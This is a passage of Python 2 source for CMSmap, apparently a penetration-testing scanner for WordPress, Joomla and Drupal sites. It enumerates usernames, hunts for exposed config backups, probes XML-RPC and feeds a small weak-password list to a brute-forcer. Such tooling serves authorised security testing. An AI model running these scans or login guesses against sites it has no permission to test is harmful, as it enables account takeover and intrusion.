#!/usr/bin/python
import smtplib, base64, os, sys, getopt, urllib2, urllib, re, socket, time, httplib, tarfile
import itertools, urlparse, threading, Queue, multiprocessing, cookielib, datetime, zipfile
import platform, signal

from thirdparty.multipart import multipartpost
from thirdparty.progressbar import progressbar

class Initialize:
    # Save Wordpress, Joomla and Drupal plugins in a local file
    # Set default parameters 
    def __init__(self):
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,}
        self.ospath = dataPath
        self.forceUpdate = None
        self.wp_plugins_small = os.path.join(self.ospath,"wp_plugins_small.txt")
        self.wp_themes_small = os.path.join(self.ospath,"wp_themes_small.txt")
        self.joo_plugins_small = os.path.join(self.ospath,"joo_plugins_small.txt")
        self.dru_plugins_small = os.path.join(self.ospath,"dru_plugins_small.txt")
        self.wp_exploitdb_url = "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=Wordpress"
        self.joo_exploitdb_url = "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=Joomla"

    def UpdateRun(self):
        if self.forceUpdate == 'C':
            self.CMSmapUpdate()
        elif self.forceUpdate == 'W':
            self.GetWordpressPluginsExploitDB()
            self.GetWordpressThemesExploitDB()
        elif self.forceUpdate == 'J':
            self.GetJoomlaPluginsExploitDB()
        elif self.forceUpdate == 'D':
            self.GetDrupalPlugins()
        else:
            msg = "Not Valid Option Provided: use (C)MSmap, (W)ordpress plugins and themes, (J)oomla components, (D)rupal modules"; report.info(msg)
            msg = "Assuming: (C)MSmap update"; report.info(msg)
            self.CMSmapUpdate()  

    def CMSmapUpdate(self):
        success = False
        if not self.ospath+".git":
            print "[!] Git Repository Not Found. Please download the latest version of CMSmap from GitHub repository"
            print "[!] Example: git clone https://github.com/Dionach/cmsmap"
        else:
            print "[*] Updating CMSmap to the latest version from GitHub repository... "
            os.chdir(self.ospath)
            process = os.system("git pull")
            if process == 0 : success = True
        if success :
            print "[*] CMSmap is now updated to the latest version!"
        else :
            print "[!] Updated could not be completed. Please download the latest version of CMSmap from GitHub repository"
            print "[!] Example: git clone https://github.com/Dionach/cmsmap"
    
    def GetWordPressPlugins(self):
        # Download Wordpress Plugins from Wordpress SVN website and popular Wordpress plugins page
        print "[*] Downloading WordPress plugins"
        f = open(os.path.join(self.ospath,"wp_plugins.txt"), "a")
        
        # from SVN Website
        htmltext = urllib2.urlopen("http://plugins.svn.wordpress.org").read()
        regex = '">(.+?)/</a></li>'
        pattern =  re.compile(regex)
        plugins = re.findall(pattern,htmltext)
        for plugin in plugins: f.write("%s\n" % plugin)
        
        # from popular Wordpress plugins page
        for n in range(1,1844):
            while True:
                try:
                    htmltext = urllib2.urlopen("http://wordpress.org/extend/plugins/browse/popular/page/"+str(n)+"/").read()
                    regex = '<h3><a href="http://wordpress.org/plugins/(.+?)/">'
                    pattern =  re.compile(regex)
                    plugins_per_page = re.findall(pattern,htmltext) 
                    #plugins.append(plugins_in_page)
                    for plugin in plugins_per_page: f.write("%s\n" % plugin) 
                    #sys.stdout.write("\r%d%%" %((100*(n+1))/1844))
                    #sys.stdout.flush()
                    sys.stdout.write('\r')
                    sys.stdout.write("[%-100s] %d%%" % ('='*((100*(n+1))/1844), (100*(n+1))/1844))
                    sys.stdout.flush()
                except:
                    time.sleep(4)
                    continue
                break
            
        # sort unique
        #oldplugins = [line.strip() for line in open('wp_plugins.txt')]
        #plugins = plugins + oldplugins
        #plugins = sorted(set(plugins))        
        # write to file
        #for plugin in plugins: f.write("%s\n" % plugin, "a")
        #f.close()             
        print "[-] Wordpress Plugin File: %s" % (os.path.join(self.ospath,'wp_plugins.txt'))
   
    def GetWordpressPluginsExploitDB(self):
        self.GetExploitDBPlugins(self.wp_exploitdb_url, self.wp_plugins_small, 'Wordpress', 'wp-content/plugins/(.+?)/')
        
    def GetWordpressThemesExploitDB(self):
        self.GetExploitDBPlugins(self.wp_exploitdb_url, self.wp_themes_small, 'Wordpress', 'wp-content/themes/([\w\-\_]*)/')

    def GetJoomlaPlugins(self):
        # Not Implemented yet
        pass
    
    def GetJoomlaPluginsExploitDB(self):
        self.GetExploitDBPlugins(self.joo_exploitdb_url, self.joo_plugins_small, 'Joomla', '\?option=(com.+?)\&')

    def GetDrupalPlugins(self):
        # Download Drupal Plugins from Drupal website
        msg = "Downloading plugins"; report.info(msg)
        f = open(self.dru_plugins_small, "a")
        self.dru_plugins_small_pages = int(10)
        
        for page in range(0,self.dru_plugins_small_pages):
            htmltext = urllib2.urlopen("https://drupal.org/project/project_module?page="+str(page)+"&f[4]=sm_field_project_type:full&text=&solrsort=iss_project_release_usage+desc&").read()
            regex = '<h2><a href="/project/(\w*?)">'
            pattern =  re.compile(regex)
            self.dru_plugins = re.findall(pattern,htmltext)
            self.dru_plugins = sorted(set(self.dru_plugins)) 
            for plugin in self.dru_plugins:
                print plugin
                f.write("%s\n" % plugin) 
                sys.stdout.write("\r%d%%" %((100*(page+1))/self.dru_plugins_small_pages))
                sys.stdout.flush()
            sys.stdout.flush()            
        
        msg = "Drupal Plugin File: "+ self.dru_plugins_small; report.info(msg)
        
    def GetExploitDBPlugins(self,exploitdb_url,plugins_small,filter_description,regex):
        self.exploitdb_url = exploitdb_url
        self.plugins_small = plugins_small
        self.filter_description = filter_description
        self.regex = regex
        # Download Plugins from ExploitDB website
        msg = "Downloading plugins from ExploitDB website"; report.info(msg)    
        # Save to file 
        f = open(os.path.join(self.ospath, self.plugins_small), "a") 
        # Read html response
        htmltext = urllib2.urlopen(self.exploitdb_url).read()
        regex ='filter_page=(.+?)\t\t\t.*>&gt;&gt;</a>'
        pattern =  re.compile(regex)
        self.pages = re.findall(pattern,htmltext)
        self.pages = self.pages[0]
        #print "Total pages: "+str(pages)
        for self.page in range(1,int(self.pages)):
            time.sleep(2)
            self.exploitdb_url_page = "http://www.exploit-db.com/search/?action=search&filter_page="+str(self.page)+"&filter_description="+self.filter_description
            request = urllib2.Request(self.exploitdb_url_page,None,self.headers)
            htmltext = urllib2.urlopen(request).read()
            pattern =  re.compile('<a href="http://www.exploit-db.com/download/(.+?)">')
            self.ExploitID = re.findall(pattern,htmltext)
            #print "Page: "+str(self.page)
            for self.Eid in self.ExploitID:
                htmltext = urllib2.urlopen("http://www.exploit-db.com/download/"+str(self.Eid)+"/").read()
                pattern =  re.compile(self.regex)
                self.ExploitDBplugins = re.findall(pattern,htmltext)
                #print self.regex
                #print self.Eid
                #print self.ExploitDBplugins
                #print htmltext
                sys.stdout.write("\r%d%%" %((100*(int(self.page)+1))/int(self.pages)))
                sys.stdout.flush()
                # Sorted Unique
                self.ExploitDBplugins = sorted(set(self.ExploitDBplugins))
                for self.plugin in self.ExploitDBplugins:
                    print self.plugin
                    if not re.search('.php',self.plugin):
                        try:
                            f.write("%s\n" % self.plugin)
                        except IndexError:
                            pass
        f.close()
        sys.stdout.write("\r")
        msg = "Plugin File: " +self.plugins_small; report.info(msg)

class Scanner:
    # Detect type of CMS -> Maybe add it to the main after Initialiazer 
    def __init__(self):
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,}
        self.url = None
        self.force = None
        self.threads = None
        self.file = None
        
    def ForceCMSType(self):
        GenericChecks(self.url).HTTPSCheck()
        GenericChecks(self.url).HeadersCheck()
        GenericChecks(self.url).RobotsTXT()
        if self.force == 'W':
            WPScan(self.url,self.threads).WPrun()
        elif self.force == 'J': 
            JooScan(self.url,self.threads).Joorun()
        elif self.force == 'D': 
            DruScan(self.url,"default",self.threads).Drurun()
        else:
            msg = "Not Valid Option Provided: use (W)ordpress, (J)oomla, (D)rupal"; report.error(msg)
            sys.exit() 
        
    def FindCMSType(self):
        req = urllib2.Request(self.url,None,self.headers)
        try:
            GenericChecks(self.url).HTTPSCheck()
            GenericChecks(self.url).HeadersCheck()
            GenericChecks(self.url).RobotsTXT()
            htmltext = urllib2.urlopen(req).read()
            # WordPress
            req = urllib2.Request(self.url+"/wp-config.php")
            try:
                urllib2.urlopen(req)
                WPScan(self.url,self.threads).WPrun()
            except urllib2.HTTPError, e:
                if e.code == 403 :
                    WPScan(self.url,self.threads).WPrun()
                else:
                    #print e.code
                    msg = "WordPress Config File Not Found: "+self.url+"/wp-config.php"
                    report.verbose(msg)
            
            # Joomla
            req = urllib2.Request(self.url+"/configuration.php")
            try:
                urllib2.urlopen(req)
                JooScan(self.url,self.threads).Joorun()
            except urllib2.HTTPError, e:
                if e.code == 403 :
                    JooScan(self.url,self.threads).Joorun()
                else:
                    #print e.code
                    msg = "[!] Joomla Config File Not Found: "+self.url+"/configuration.php"
                    report.verbose(msg)    
            
            # Drupal
            req = urllib2.Request(self.url+"/sites/default/settings.php")
            try:
                urllib2.urlopen(req)
                DruScan(self.url,"default",self.threads).Drurun()
            except urllib2.HTTPError, e:
                pUrl = urlparse.urlparse(self.url)
                netloc = pUrl.netloc.lower()
                req = urllib2.Request(self.url+"/sites/"+netloc+"/settings.php")
                try:
                    urllib2.urlopen(req)
                    DruScan(self.url,netloc,self.threads).Drurun()
                except urllib2.HTTPError, e:
                    if e.code == 403 :
                        DruScan(self.url,netloc,self.threads).Drurun()
                    else:
                        if verbose:
                            #print e.code
                            msg = "Drupal Config File Not Found: "+self.url+"/sites/default/settings.php"
                            report.verbose(msg)

            msg = "CMS detection failed"; report.error(msg)
            msg =  "Use -f to force CMSmap to scan (W)ordpress, (J)oomla or (D)rupal"; report.error(msg)
            sys.exit()
                
        except urllib2.URLError, e:
            msg = "Website Unreachable: "+self.url
            report.error(msg)
            sys.exit()

    def CheckURL(self):
        pUrl = urlparse.urlparse(self.url)
        #clean up supplied URLs
        netloc = pUrl.netloc.lower()
        scheme = pUrl.scheme.lower()  
        path = pUrl.path.lower()  
        if not scheme:
            self.url = "http://" + self.url
            report.status("No HTTP/HTTPS provided. Assuming HTTP...")
        if path.endswith("asp" or "aspx"):
            report.error("You are not scanning a PHP website")
            sys.exit()
        if path.endswith("txt" or "php"):
            self.url = re.findall(re.compile('(.+?)/[A-Za-z0-9]+\.txt|php'),self.url)[0]
        if self.url.endswith("/") :
            self.url = self.url[:-1]

class WPScan:
    # Scan WordPress site
    def __init__(self,url,threads):
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,}
        self.url = url
        self.currentVer = None
        self.latestVer = None
        self.queue_num = 5
        self.thread_num = threads
        self.pluginPath = "/wp-content/plugins/"
        self.themePath = "/wp-content/themes/"
        self.feed = "/?feed=rss2"
        self.author = "/?author="
        self.forgottenPsw = "/wp-login.php?action=lostpassword"
        self.weakpsw = ['password', 'admin','123456','Password1'] # 5th attempt is the username
        self.usernames = []
        self.pluginsFound = []
        self.themesFound = []
        self.timthumbsFound = []
        self.notValidLen = []
        self.theme = None
        self.notExistingCode = 404
        self.confFiles=['','.php~','.php.txt','.php.old','.php_old','.php-old','.php.save','.php.swp','.php.swo','.php_bak','.php-bak','.php.original','.php.old','.php.orig','.php.bak','.save','.old','.bak','.orig','.original','.txt']
        self.widgets = ['Progress: ', progressbar.Percentage(), ' ', progressbar.Bar(marker=progressbar.RotatingMarker()),' ', progressbar.ETA(), ' ', progressbar.FileTransferSpeed()]
        self.genChecker = GenericChecks(url)
        self.genChecker.NotExisitingLength()
        self.plugins_small = [line.strip() for line in open(os.path.join(dataPath, 'wp_plugins_small.txt'))]
        self.plugins = [line.strip() for line in open(os.path.join(dataPath, 'wp_plugins.txt'))]
        self.versions = [line.strip() for line in open(os.path.join(dataPath, 'wp_versions.txt'))]
        self.themes = [line.strip() for line in open(os.path.join(dataPath, 'wp_themes.txt'))]
        self.themes_small = [line.strip() for line in open(os.path.join(dataPath, 'wp_themes_small.txt'))]
        self.timthumbs = [line.strip() for line in open(os.path.join(dataPath, 'wp_timthumbs.txt'))]
            
    def WPrun(self):
        msg = "CMS Detection: Wordpress"; report.info(msg)
        self.WPVersion()
        self.WPCurrentTheme()
        self.WPConfigFiles()
        self.WPHello()
        self.WPFeed()
        self.WPAuthor()
        BruteForcer(self.url,self.usernames,self.weakpsw).WPrun()
        self.WPForgottenPassword()
        self.WPXMLRPC_pingback()
        self.WPXMLRPC_BF()
        self.genChecker.AutocompleteOff('/wp-login.php')
        self.WPNotExisitingCode()
        self.WPDefaultFiles()
        #self.genChecker.CommonFiles()
        self.WPplugins()
        ExploitDBSearch(self.url, 'Wordpress', self.pluginsFound).Plugins()
        self.WPThemes()
        # Search for other vulnerable themes installed
        ExploitDBSearch(self.url, 'Wordpress', self.themesFound).Themes()
        self.WPTimThumbs()
        self.WPDirsListing()
              
    def WPVersion(self):
        try:
            req = urllib2.Request(self.url+'/readme.html',None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            regex = '<br />[ ]*Version[e]* (\d+\.\d+[\.\d+]*)'
            pattern =  re.compile(regex)
            version = re.findall(pattern,htmltext)[0]
            if version:
                msg = "Wordpress Version: "+version; report.info(msg)
            else:
                req = urllib2.Request(self.url,None,self.headers)
                htmltext = urllib2.urlopen(req).read()
                version = re.findall('<meta name="generator" content="WordPress (\d+\.\d+[\.\d+]*)"', htmltext)
                if version:
                    msg = "Wordpress Version: "+version; report.info(msg)
                    
            if version in self.versions :
                for ver in self.versions:
                    ExploitDBSearch(self.url, 'Wordpress', ver).Core()
                    if ver == version:
                        break                       
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def WPCurrentTheme(self):
        try:
            req = urllib2.Request(self.url,None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            regex = '/wp-content/themes/(.+?)/'
            pattern =  re.compile(regex)
            CurrentTheme = re.findall(pattern,htmltext)
            if CurrentTheme:
                self.theme = CurrentTheme[0]
                msg = "Wordpress Theme: "+self.theme ; report.info(msg)
                ExploitDBSearch(self.url, 'Wordpress', [self.theme]).Themes()
        except urllib2.HTTPError, e:
            #print e.code
            pass
        
    def WPConfigFiles(self):
        for file in self.confFiles:
            req = urllib2.Request(self.url+"/wp-config"+file,None,self.headers)
            try:
                urllib2.urlopen(req)
                msg = "Configuration File Found: " +self.url+"/wp-config"+file; report.high(msg)
            except urllib2.HTTPError, e:
                pass

    def WPDefaultFiles(self):
        # Check for default files
        self.defFilesFound = []
        msg = "Default WordPress Files:"; report.message(msg)
        self.defFiles=['/readme.html',
                      '/license.txt',
                      '/xmlrpc.php',
                      '/wp-config-sample.php',
                      '/wp-includes/images/crystal/license.txt',
                      '/wp-includes/images/crystal/license.txt',
                      '/wp-includes/js/plupload/license.txt',
                      '/wp-includes/js/plupload/changelog.txt',
                      '/wp-includes/js/tinymce/license.txt',
                      '/wp-includes/js/tinymce/plugins/spellchecker/changelog.txt',
                      '/wp-includes/js/swfupload/license.txt',
                      '/wp-includes/ID3/license.txt',
                      '/wp-includes/ID3/readme.txt',
                      '/wp-includes/ID3/license.commercial.txt',
                      '/wp-content/themes/twentythirteen/fonts/COPYING.txt',
                      '/wp-content/themes/twentythirteen/fonts/LICENSE.txt'
                      ]
        for file in self.defFiles:
            req = urllib2.Request(self.url+file,None,self.headers)
            try:
                urllib2.urlopen(req)
                self.defFilesFound.append(self.url+file)
            except urllib2.HTTPError, e:
                #print e.code
                pass
        for file in self.defFilesFound:
            msg = file; report.info(msg)
            
    def WPFeed(self):
        msg = "Enumerating Wordpress Usernames via \"Feed\" ..."; report.message(msg)
        try:
            req = urllib2.Request(self.url+self.feed,None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            wpUsers = re.findall("<dc:creator><!\[CDATA\[(.+?)\]\]></dc:creator>", htmltext,re.IGNORECASE)
            wpUsers2 = re.findall("<dc:creator>(.+?)</dc:creator>", htmltext,re.IGNORECASE)
            if wpUsers :
                self.usernames = wpUsers + self.usernames
                self.usernames = sorted(set(self.usernames))
            for user in self.usernames:
                msg = user; report.medium(msg)
        except urllib2.HTTPError, e:
            #print e.code
            pass
        
    def WPAuthor(self):
        msg = "Enumerating Wordpress Usernames via \"Author\" ..."; report.message(msg)
        for user in range(1,20):
            try:
                req = urllib2.Request(self.url+self.author+str(user),None,self.headers)
                htmltext = urllib2.urlopen(req).read()
                wpUser = re.findall("author author-(.+?) ", htmltext,re.IGNORECASE)
                if wpUser : self.usernames = wpUser + self.usernames
                wpUser = re.findall("/author/(.+?)/feed/", htmltext,re.IGNORECASE)
                if wpUser : self.usernames = wpUser + self.usernames                 
            except urllib2.HTTPError, e:
                #print e.code
                pass
        self.usernames = sorted(set(self.usernames))
        for user in self.usernames:
            msg = user; report.medium(msg)
        
    def WPForgottenPassword(self):
        # Username Enumeration via Forgotten Password
        query_args = {"user_login": "N0t3xist!1234"}
        data = urllib.urlencode(query_args)
        # HTTP POST Request
        req = urllib2.Request(self.url+self.forgottenPsw, data,self.headers)
        try:
            htmltext = urllib2.urlopen(req).read()
            if re.findall(re.compile('Invalid username'),htmltext):
                msg = "Forgotten Password Allows Username Enumeration: "+self.url+self.forgottenPsw; report.info(msg)        
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def WPHello(self):
        try:
            req = urllib2.Request(self.url+"/wp-content/plugins/hello.php",None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            fullPath = re.findall(re.compile('Fatal error.*>/(.+?/)hello.php'),htmltext)
            if fullPath :
                msg = "Wordpress Hello Plugin Full Path Disclosure: "+"/"+fullPath[0]+"hello.php"; report.low(msg)
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def WPDirsListing(self):
        msg = "Checking for Directory Listing Enabled ..."; report.info(msg)
        report.WriteTextFile(msg)
        GenericChecks(self.url).DirectoryListing('/wp-content/')
        if self.theme: GenericChecks(self.url).DirectoryListing('/wp-content/'+self.theme)
        GenericChecks(self.url).DirectoryListing('/wp-includes/')
        GenericChecks(self.url).DirectoryListing('/wp-admin/')        
        for plugin in self.pluginsFound:
            GenericChecks(self.url).DirectoryListing('/wp-content/plugins/'+plugin)

    def WPNotExisitingCode(self):
        req = urllib2.Request(self.url+self.pluginPath+"N0WayThatYouAreHere123"+"/",None, self.headers)
        noRedirOpener = urllib2.build_opener(NoRedirects())        
        try:
            htmltext = noRedirOpener.open(req).read()
            self.notValidLen.append(len(htmltext))
        except urllib2.HTTPError, e:
            #print e.code
            self.notValidLen.append(len(e.read()))
            self.notExistingCode = e.code
                        
    def WPplugins(self):
        msg =  "Searching Wordpress Plugins ..."; report.message(msg)
        if  not FullScan : self.plugins = self.plugins_small
        self.pbar = progressbar.ProgressBar(widgets=self.widgets, maxval=len(self.plugins)).start()
        # Create Code
        q = Queue.Queue(self.queue_num)        
        # Spawn all threads into code
        for u in range(self.thread_num):
            t = ThreadScanner(self.url,self.pluginPath,"/",self.pluginsFound,self.notExistingCode,self.notValidLen,q)
            t.daemon = True
            t.start()
        # Add all plugins to the queue
        for r,i in enumerate(self.plugins):
            q.put(i)
            self.pbar.update(r+1)
        q.join()
        self.pbar.finish()

    def WPTimThumbs(self):
        msg =  "Searching Wordpress TimThumbs ..."; report.message(msg)          
        self.pbar = progressbar.ProgressBar(widgets=self.widgets, maxval=len(self.timthumbs)).start()
        # Create Code
        q = Queue.Queue(self.queue_num)        
        # Spawn all threads into code
        for u in range(self.thread_num):
            t = ThreadScanner(self.url,"/","/",self.timthumbsFound,self.notExistingCode,self.notValidLen,q)
            t.daemon = True
            t.start()
        # Add all plugins to the queue
        for r,i in enumerate(self.timthumbs):
            q.put(i)
            self.pbar.update(r+1)
        q.join()
        self.pbar.finish()
        if self.timthumbsFound:
            for timthumbsFound in self.timthumbsFound:
                msg = self.url+"/"+timthumbsFound; report.medium(msg)
            msg= "  Timthumbs Potentially Vulnerable to File Upload: http://www.exploit-db.com/wordpress-timthumb-exploitation"; report.medium(msg)
            
    def WPThemes(self):
        msg = "Searching Wordpress Themes ..."; report.message(msg)
        if  not FullScan : self.themes = self.themes_small
        self.pbar = progressbar.ProgressBar(widgets=self.widgets, maxval=len(self.themes)).start()
        # Create Code
        q = Queue.Queue(self.queue_num)
        # Spawn all threads into code
        for u in range(self.thread_num):
            t = ThreadScanner(self.url,self.themePath,"/",self.themesFound,self.notExistingCode,self.notValidLen,q)
            t.daemon = True
            t.start()                
        # Add all theme to the queue
        for r,i in enumerate(self.themes):
            q.put(i)
            self.pbar.update(r+1)
        q.join()
        self.pbar.finish()
        for themesFound in self.themesFound:
            msg = themesFound; report.info(msg)
    
    def WPXMLRPC_pingback(self):
        msg = "Checking XML-RPC Pingback Vulnerability ..."; report.verbose(msg)
        self.postdata = '''<methodCall><methodName>pingback.ping</methodName><params>
                        <param><value><string>http://N0tB3th3re0484940:22/</string></value></param>
                        <param><value><string>'''+self.url+'''</string></value></param>
                        </params></methodCall>'''
        try:
            req = urllib2.Request(self.url+'/xmlrpc.php',self.postdata,self.headers)
            opener = urllib2.build_opener(MyHandler())
            htmltext = opener.open(req).read()
            if re.search('<name>16</name>',htmltext):
                msg = "Website vulnerable to XML-RPC Pingback Force Vulnerability"; report.low(msg)
        except urllib2.HTTPError, e:
            #print e.code
            pass
        
    def WPXMLRPC_BF(self):
        msg = "Checking XML-RPC Brute Force Vulnerability ..."; report.verbose(msg)
        self.headers['Content-Type'] ='text/xml'
        self.postdata = '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string></string></value></param></params></methodCall>'
        try:
            req = urllib2.Request(self.url+'/xmlrpc.php',self.postdata,self.headers)
            #opener = urllib2.build_opener(urllib2.HTTPHandler(debuglevel=1))
            opener = urllib2.build_opener(MyHandler())
            htmltext = opener.open(req).read()
            if re.search('<int>403</int>',htmltext):
                msg = "Website vulnerable to XML-RPC Brute Force Vulnerability"; report.medium(msg)
        except urllib2.HTTPError, e:
            print e.code
            pass


class MyResponse(httplib.HTTPResponse):
    def read(self, amt=None):
        self.length = None
        
        return httplib.HTTPResponse.read(self, amt)

class MyHandler(urllib2.HTTPHandler):
    def do_open(self, http_class, req):
        h = httplib.HTTPConnection
        h.response_class = MyResponse
        
        return urllib2.HTTPHandler.do_open(self, h, req)

class JooScan:
    # Scan Joomla site
    def __init__(self,url,threads):
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,}
        self.url = url
        self.queue_num = 5
        self.thread_num = threads
        self.usernames = []
        self.pluginPath = "/components/"
        self.pluginsFound = []
        self.notValidLen = []
        self.notExistingCode = 404
        self.weakpsw = ['password', 'admin','123456','Password1'] # 5th attempt is the username 
        self.confFiles=['','.php~','.php.txt','.php.old','.php_old','.php-old','.php.save','.php.swp','.php.swo','.php_bak','.php-bak','.php.original','.php.old','.php.orig','.php.bak','.save','.old','.bak','.orig','.original','.txt']
        self.widgets = ['Progress: ', progressbar.Percentage(), ' ', progressbar.Bar(marker=progressbar.RotatingMarker()),' ', progressbar.ETA(), ' ', progressbar.FileTransferSpeed()]
        self.genChecker = GenericChecks(url)
        self.genChecker.NotExisitingLength()
        self.plugins_small = [line.strip() for line in open(os.path.join(dataPath, 'joo_plugins_small.txt'))]
        self.plugins = [line.strip() for line in open(os.path.join(dataPath, 'joomla_plugins.txt'))]
        self.versions = [line.strip() for line in open(os.path.join(dataPath, 'joomla_versions.txt'))]
        
    def Joorun(self):
        msg = "CMS Detection: Joomla"; report.info(msg)
        self.JooVersion()
        self.JooTemplate()
        self.JooConfigFiles()
        self.JooFeed()
        BruteForcer(self.url,self.usernames,self.weakpsw).Joorun()
        self.JooNotExisitingCode()
        self.JooDefaultFiles()
        # === Takes Long ===
        self.genChecker.CommonFiles()
        self.JooComponents()
        ExploitDBSearch(self.url, "Joomla", self.pluginsFound).Plugins()
        self.JooDirsListing()
        
    def JooVersion(self):
        try:
            htmltext = urllib2.urlopen(self.url+'/joomla.xml').read()
            regex = '<version>(.+?)</version>'
            pattern =  re.compile(regex)
            version = re.findall(pattern,htmltext)[0]
            if version:
                msg = "Joomla Version: "+version; report.info(msg)
                for ver in self.versions:
                    ExploitDBSearch(self.url, 'Joomla', ver).Core()
                    if ver == version:
                        break 
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def JooTemplate(self):
        try:
            htmltext = urllib2.urlopen(self.url+'/index.php').read()
            WebTemplate = re.findall("/templates/(.+?)/", htmltext,re.IGNORECASE)
            htmltext = urllib2.urlopen(self.url+'/administrator/index.php').read()
            AdminTemplate = re.findall("/administrator/templates/(.+?)/", htmltext,re.IGNORECASE)
            if WebTemplate : 
                msg = "Joomla Website Template: "+WebTemplate[0]; report.info(msg)
                ExploitDBSearch(self.url, "Joomla", [WebTemplate[0]]).Themes()
            if AdminTemplate : 
                msg = "Joomla Administrator Template: "+AdminTemplate[0]; report.info(msg)
                ExploitDBSearch(self.url, "Joomla", [WebTemplate[0]]).Themes()
        except urllib2.HTTPError, e:
            #print e.code
            pass
        
    def JooConfigFiles(self):
        for file in self.confFiles:
            req = urllib2.Request(self.url+"/configuration"+file)
            try:
                urllib2.urlopen(req)
                msg = "Configuration File Found: " +self.url+"/configuration"+file; report.high(msg)
            except urllib2.HTTPError, e:
                #print e.code
                pass        
    
    def JooDefaultFiles(self):
        self.defFilesFound = []
        msg = "Joomla Default Files: "; report.message(msg)
        # Check for default files
        self.defFiles=['/README.txt',
                  '/htaccess.txt',
                  '/administrator/templates/hathor/LICENSE.txt',
                  '/web.config.txt',
                  '/joomla.xml',
                  '/robots.txt.dist',
                  '/LICENSE.txt',
                  '/media/jui/fonts/icomoon-license.txt',
                  '/media/editors/tinymce/jscripts/tiny_mce/license.txt',
                  '/media/editors/tinymce/jscripts/tiny_mce/plugins/style/readme.txt',
                  '/libraries/idna_convert/ReadMe.txt',
                  '/libraries/simplepie/README.txt',
                  '/libraries/simplepie/LICENSE.txt',
                  '/libraries/simplepie/idn/ReadMe.txt',
                  ]
        for file in self.defFiles:
            req = urllib2.Request(self.url+file,None,self.headers)
            try:
                urllib2.urlopen(req)
                self.defFilesFound.append(self.url+file)
            except urllib2.HTTPError, e:
                #print e.code
                pass
        for file in self.defFilesFound:
            msg = file; report.info(msg)
            
    def JooFeed(self):
        try:
            htmltext = urllib2.urlopen(self.url+'/?format=feed').read()
            jooUsers = re.findall("<author>(.+?) \((.+?)\)</author>", htmltext,re.IGNORECASE)
            if jooUsers: 
                msg = "Enumerating Joomla Usernames via \"Feed\" ..."; report.message(msg)
                jooUsers = sorted(set(jooUsers))
                for user in jooUsers :
                    self.usernames.append(user[1])
                    msg =  user[1]+" "+user[0]; report.info(msg)
        except urllib2.HTTPError, e:
            #print e.code
            pass 
        
    def JooDirsListing(self):
        msg = "Checking for Directory Listing Enabled ..."; print msg
        report.WriteTextFile(msg)
        GenericChecks(self.url).DirectoryListing('/administrator/')
        GenericChecks(self.url).DirectoryListing('/bin/')
        GenericChecks(self.url).DirectoryListing('/cache/')
        GenericChecks(self.url).DirectoryListing('/cli/')
        GenericChecks(self.url).DirectoryListing('/components/')
        GenericChecks(self.url).DirectoryListing('/images/')
        GenericChecks(self.url).DirectoryListing('/includes/')
        GenericChecks(self.url).DirectoryListing('/language/')
        GenericChecks(self.url).DirectoryListing('/layouts/')
        GenericChecks(self.url).DirectoryListing('/libraries/')
        GenericChecks(self.url).DirectoryListing('/media/')
        GenericChecks(self.url).DirectoryListing('/modules/')
        GenericChecks(self.url).DirectoryListing('/plugins/')
        GenericChecks(self.url).DirectoryListing('/templates/')
        GenericChecks(self.url).DirectoryListing('/tmp/')
        for plugin in self.pluginsFound:
            GenericChecks(self.url).DirectoryListing('/components/'+plugin)
            
    def JooNotExisitingCode(self):
        req = urllib2.Request(self.url+self.pluginPath+"N0WayThatYouAreHere123"+"/",None, self.headers)
        noRedirOpener = urllib2.build_opener(NoRedirects())        
        try:
            htmltext = noRedirOpener.open(req).read()
            self.notValidLen.append(len(htmltext))
        except urllib2.HTTPError, e:
            #print e.code
            self.notValidLen.append(len(e.read()))
            self.notExistingCode = e.code
            
    def JooComponents(self):
        msg = "Searching Joomla Components ..."; report.message(msg)
        if  not FullScan : self.plugins = self.plugins_small
        self.pbar = progressbar.ProgressBar(widgets=self.widgets, maxval=len(self.plugins)).start()
        # Create Code
        q = Queue.Queue(self.queue_num)        
        # Spawn all threads into code
        for u in range(self.thread_num):
            t = ThreadScanner(self.url,self.pluginPath,"/",self.pluginsFound,self.notExistingCode,self.notExistingCode,q)
            t.daemon = True
            t.start()
        # Add all plugins to the queue
        for r,i in enumerate(self.plugins):
            q.put(i)  
            self.pbar.update(r+1)
        q.join()
        self.pbar.finish()
        
class DruScan:
    # Scan Drupal site
    def __init__(self,url,netloc,threads):
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,}
        self.url = url
        self.queue_num = 5
        self.thread_num = threads
        self.notExistingCode = 404
        self.notValidLen = []
        self.netloc = netloc
        self.pluginPath = "/modules/"
        self.forgottenPsw = "/?q=user/password"
        self.weakpsw = ['password', 'admin','123456','Password1'] # 5th attempt is the username
        self.confFiles=['','.php~','.php.txt','.php.old','.php_old','.php-old','.php.save','.php.swp','.php.swo','.php_bak','.php-bak','.php.original','.php.old','.php.orig','.php.bak','.save','.old','.bak','.orig','.original','.txt']
        self.usernames = []
        self.pluginsFound = []
        self.widgets = ['Progress: ', progressbar.Percentage(), ' ', progressbar.Bar(marker=progressbar.RotatingMarker()),' ', progressbar.ETA(), ' ', progressbar.FileTransferSpeed()]
        self.genChecker = GenericChecks(url)
        self.genChecker.NotExisitingLength()
